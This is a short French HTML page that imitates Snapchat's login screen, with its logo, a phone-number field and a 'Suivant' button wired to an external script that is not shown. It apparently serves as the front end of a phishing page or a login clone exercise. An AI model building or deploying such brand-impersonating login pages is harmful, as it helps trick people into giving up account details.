<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Se connecter à Snapchat</title>
    <link rel="icon" type="image/png" href="téléchargement.png">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="card">
            <img src="canva-snapchat-logo-MAGzZ1jpOSg.png" alt="Snapchat Logo" class="logo">
            <h1>Se connecter à Snapchat</h1>
            <form id="loginForm" class="form">
                <div class="input-group">
                    <label for="username">Numéro de téléphone</label>
                    <input 
                        type="tel" 
                        id="username" 
                        name="username" 
                        placeholder="06 12 34 56 78"
                        required
                        maxlength="14"
                    >
                </div>
                
                <div id="errorMessage" class="error-message"></div>
                
                <button type="submit" class="btn btn-primary">Suivant</button>
            </form>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
